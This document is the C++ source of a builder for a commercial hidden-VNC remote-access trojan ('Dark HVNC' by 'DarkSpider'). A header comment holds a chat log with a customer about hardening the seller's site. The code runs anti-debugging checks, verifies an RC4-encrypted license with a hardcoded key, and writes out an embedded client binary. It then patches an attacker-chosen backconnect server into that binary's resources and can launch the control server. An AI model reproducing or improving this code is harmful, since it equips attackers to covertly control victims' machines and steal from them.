// dark_hiddenDesktopBuilder.cpp : Diese Datei enthält die Funktion "main". Hier beginnt und endet die Ausführung des Programms.
//


/*

(18:24:44) somekinkysexgoingon@jabber.cz: No, i just came back after 2 days
(18:25:03) somekinkysexgoingon@jabber.cz: Very nice will test today with worldmix
(18:25:08) somekinkysexgoingon@jabber.cz: but also as you see
(18:25:26) somekinkysexgoingon@jabber.cz: someone run scanner on site
(18:25:38) somekinkysexgoingon@jabber.cz: so alot of fake users has been created, protentially they can fill the network
(18:26:00) somekinkysexgoingon@jabber.cz: it can be solved simply, rate limit a IP to 1 registration per hour
(18:26:11) somekinkysexgoingon@jabber.cz: Add a captcha
(18:26:21) somekinkysexgoingon@jabber.cz: Change minimum. username to 5 characters
(18:26:38) somekinkysexgoingon@jabber.cz: add CSRF to avoid forgery
(18:27:02) somekinkysexgoingon@jabber.cz: (CSRF and Captcha are top solution with rate limit)
(18:27:16) somekinkysexgoingon@jabber.cz: then we will avoid these junk users to be accepted as registrations
(18:27:24) DarkSpider: haah nice yea should be easy
(18:27:42) somekinkysexgoingon@jabber.cz: It is easy
(18:27:45) somekinkysexgoingon@jabber.cz: Just encrypt IPs
(18:28:21) somekinkysexgoingon@jabber.cz: Because their will always be a retard who signup without VPN and gets rate limited cause of retarded actions
(18:29:08) somekinkysexgoingon@jabber.cz: My partner asked you to change a order to EU ?
(18:29:39) somekinkysexgoingon@jabber.cz: Also for tickets - You should require a title and a message
(18:29:58) somekinkysexgoingon@jabber.cz: and a minimum character for title and message so we dont get these empty tickets from people who play hackers

*/

#include <Windows.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include <string>

#include "base64.h"
#include "antidbg.h"
#include "Runpe.h"
#include "rc4.h"
#include "rawControllServer.h"
#include "rawClient.h"
#include "json.hpp"


long WINAPI unhandled_exception_handler(EXCEPTION_POINTERS* p_exceptions)
{
	(void*)p_exceptions;
	return EXCEPTION_EXECUTE_HANDLER;
}

void WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
{
	HANDLE hResource = NULL;
	hResource = BeginUpdateResourceA(szTargetPE, FALSE);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}

std::string readFile()
{
	std::stringstream str;
	std::ifstream stream("darkrat.lic");
	if (stream.is_open())
	{
		while (stream.peek() != EOF)
		{
			str << (char)stream.get();
		}
		stream.close();
		return str.str();
	}
	else {
		return "false";
	}
}

int main()
{

	SetUnhandledExceptionFilter(unhandled_exception_handler);
	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
	_set_abort_behavior(0, _WRITE_ABORT_MSG | _CALL_REPORTFAULT);
	adbg_IsDebuggerPresent();
	adbg_IsDebuggerPresent();
	adbg_CheckRemoteDebuggerPresent();
	/*
	adbg_BeingDebuggedPEB();
	adbg_NtGlobalFlagPEB();
	adbg_HardwareDebugRegisters();
	adbg_RDTSC();
	adbg_QueryPerformanceCounter();
	adbg_GetTickCount();
	*/
	std::string user;
	std::string license = readFile();
	if (license == "false") {
		//return 0;
	}

	std::cout << "Username:"; std::cin >> user;

	darkvnc::crypto::RC4 rc4;
	std::string enckey = "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>";
	std::string toDecrypt;
	toDecrypt = rc4.doRC4(base64_decode(license.c_str()), (char*)enckey.c_str());
	char* c_wwrite = &toDecrypt[0u];
	//system("cls");
	json::JSON j_config = json::Object();
	j_config = json::JSON::Load(toDecrypt);
	if (j_config["username"].ToString() != user) {
		return 0;
	}
	system("cls");
	std::cout << "Welcome Back '" + user + "'  \n\n";


std::cout << R"(
  ____             _      _   ___     ___   _  ____ 
 |  _ \  __ _ _ __| | __ | | | \ \   / / \ | |/ ___|
 | | | |/ _` | '__| |/ / | |_| |\ \ / /|  \| | |    
 | |_| | (_| | |  |   <  |  _  | \ V / | |\  | |___ 
 |____/ \__,_|_|  |_|\_\ |_| |_|  \_/  |_| \_|\____|
 Created by DarkSpider		
 Jabber: darkspider@exploit.im        

 HVNC is booting up..                                          
)";

	Sleep(2000);
	system("cls");
	std::cout << "What did you want to do:\n";
	std::cout << "[1] Build New Client\n"
		<< "[2] Start Controll Server\n";

	std::string input;
	std::getline(std::cin, input);

	while (true) {
		system("cls");
		std::cout << "What did you want to do:\n";
		std::cout << "[1] Build New Client\n"
			<< "[2] Start Controll Server\n";
		std::getline(std::cin, input);

		if (input == "1") {

			system("cls");

			std::cout << "Writing Base Bin..\n";
			remove("hvnc.exe");
			DWORD Res;
			HANDLE hFile = CreateFile(L"hvnc.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (INVALID_HANDLE_VALUE == hFile) {
				return false;
			}
			WriteFile(hFile, rawClient, sizeof(rawClient), &Res, NULL);
			CloseHandle(hFile);
			Sleep(1000);


			std::string write;
			std::cout << "Enter your Backconnect Server: (127.0.0.1): ";
			std::cin >> write;

			std::cout << write << std::endl;
			char* c_write = &write[0u];
			std::cout << write << std::endl;
			WriteToResources("Client.exe", 10, (BYTE*)c_write, strlen(c_write));
		}
		else if (input == "2") {
			runBackServer(rawControllServer);
		}
	}



}

